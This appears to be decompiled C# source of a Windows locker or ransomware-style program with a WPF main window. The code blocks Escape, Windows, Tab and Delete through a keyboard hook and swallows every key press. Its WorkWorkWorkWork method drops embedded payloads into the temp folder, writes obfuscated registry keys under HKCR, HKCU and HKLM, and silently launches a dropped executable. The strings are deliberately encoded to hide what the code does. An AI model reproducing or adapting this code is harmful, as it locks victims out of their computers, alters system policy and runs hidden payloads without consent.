using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Markup;
using Microsoft.Win32;

public class MainWindow : Window, IComponentConnector
{
	private Class1 class1_0;

	internal MainWindow mainWindow_0;

	internal MediaElement mediaElement_0;

	private bool bool_0;

	public MainWindow()
	{
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		Console.WriteLine(Class4.smethod_0("좩즫즭\ud9af\udcb1\udab3\udfb5횷\uddb9鶻", 1));
		class1_0 = new Class1();
		class1_0.list_0.Add((Keys)27);
		class1_0.list_0.Add((Keys)91);
		class1_0.list_0.Add((Keys)92);
		class1_0.list_0.Add((Keys)9);
		class1_0.list_0.Add((Keys)46);
		class1_0.Event_0 += new KeyEventHandler(method_0);
		class1_0.method_0();
		WorkWorkWorkWork();
		InitializeComponent();
	}

	private void method_0(object sender, KeyEventArgs e)
	{
		e.set_Handled(true);
	}

	private void mainWindow_0_PreviewKeyDown(object sender, KeyEventArgs e)
	{
		((RoutedEventArgs)e).set_Handled(true);
	}

	public void WorkWorkWorkWork()
	{
		string tempPath = Path.GetTempPath();
		File.WriteAllBytes(tempPath + Class4.smethod_0("슪캬삮\udfb0鶲\udcb4풶횸", 2), Class2.Byte_4);
		RegistryKey registryKey = Registry.ClassesRoot.CreateSubKey(Class4.smethod_0("\udfaa햬\udbaeힰ\udab2\ud9b4튶\ue5b8ﾺ\ud8bc\ud9beꃀ뛂꧄돆胈\ua8caꋌꇎ", 2));
		registryKey.SetValue("", tempPath + Class4.smethod_0("욮튰\udcb2\udbb4馶킸\ud8ba튼", 6));
		registryKey.Close();
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(Class4.smethod_0("\uf2b0\udcb2\udbb4쎶쮸풺톼龾釀ꋂꯄꋆꗈ韊觌\uaaceꋐ룒ꇔ룖꧘", 8));
		registryKey2.SetValue(Class4.smethod_0("玲톯\udeb1\ud8b3욵\ud9b7쪹\ud9bb첽", 5), "");
		registryKey2.Close();
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey(Class4.smethod_0("囹쎫좭쒯얱햳쒵\uddb7\ue6b9\uf1bbힽꎿ냁ꯃ뗅Ꟈ곉룋鋍蟏믑뫓닕럗귙꿛苝ꏟ韡難铥跧蓩飫룭闯胱蟳鿵韷铹ꃻ껽濿渁洃攅愇漉缋刍䌏欑朓戕紗眙", 1));
		registryKey3.SetValue(Class4.smethod_0("\uf5b0\udab2운횶\udbb8ힺ\ud8bc\uebbeꃀ냂껄諆껈맊", 8), Class4.smethod_0("鶫", 3));
		registryKey3.Close();
		RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey(Class4.smethod_0("囹쎫좭쒯얱햳쒵\uddb7\ue6b9\uf1bbힽꎿ냁ꯃ뗅Ꟈ곉룋鋍蟏믑뫓닕럗귙꿛ﻝ껟뛡룣ꗥ鷧飩黫语黯蛱ꋳ鏵諷觹闻釽滿币匃漅昇昉挋植缏簑", 1));
		registryKey4.SetValue(Class4.smethod_0("\uefad얯욱\udbb3\ue4b5\uddb7즹좻\udfbd늿뛁韃껅귇ꛉꃋ", 5), Class4.smethod_0("麭", 5), RegistryValueKind.DWord);
		registryKey4.Close();
		File.WriteAllBytes(tempPath + Class4.smethod_0("\udaad햯쪱삳颵첷승좻", 5), Class2.Byte_5);
		File.WriteAllBytes(tempPath + Class4.smethod_0("우\udab2\udbb4펶햸閺\udfbc\udebe뗀", 8), Class2.Byte_6);
		File.WriteAllBytes(tempPath + Class4.smethod_0("솭\udeafힱ骳쒵첷\udcb9", 5), Class2.Byte_2);
		File.WriteAllBytes(tempPath + Class4.smethod_0("쎰\uddb2\udcb4삶鞸\udeba얼\udabe", 8), Class2.Byte_3);
		Process.Start(new ProcessStartInfo(tempPath + Class4.smethod_0("\ud8ae\ud8b0\uddb2톴\udbb6鞸\ud9ba\udcbc쮾", 6))
		{
			CreateNoWindow = true,
			UseShellExecute = false
		});
	}

	private void mediaElement_0_MediaEnded(object sender, RoutedEventArgs e)
	{
		((MediaElement)((sender is MediaElement) ? sender : null)).set_Position(TimeSpan.FromMilliseconds(1.0));
	}

	private void mediaElement_0_Loaded(object sender, RoutedEventArgs e)
	{
		string text = Path.GetTempPath() + Class4.smethod_0("\udbac膮\udcb0쎲膴", 4);
		File.WriteAllBytes(text, Class2.Byte_1);
		mediaElement_0.set_Source(new Uri(text));
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	public void InitializeComponent()
	{
		if (!bool_0)
		{
			bool_0 = true;
			Uri uri = new Uri(Class4.smethod_0("芬\uebae킰솲\udeb4\uf6b6\udeb8\udeba蚼\udcbe껀껂뗄\ua8c6ꟈ껊ꏌ믎ﻐ뻒듔뻖럘곚드뇞藠賢鋤짦釨諪胬菮", 4), UriKind.Relative);
			Application.LoadComponent((object)this, uri);
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[DebuggerNonUserCode]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		switch (connectionId)
		{
		default:
			bool_0 = true;
			break;
		case 2:
			mediaElement_0 = (MediaElement)target;
			((FrameworkElement)mediaElement_0).add_Loaded(new RoutedEventHandler(mediaElement_0_Loaded));
			mediaElement_0.add_MediaEnded(new RoutedEventHandler(mediaElement_0_MediaEnded));
			break;
		case 1:
			mainWindow_0 = (MainWindow)target;
			((UIElement)mainWindow_0).add_PreviewKeyDown(new KeyEventHandler(mainWindow_0_PreviewKeyDown));
			break;
		}
	}
}
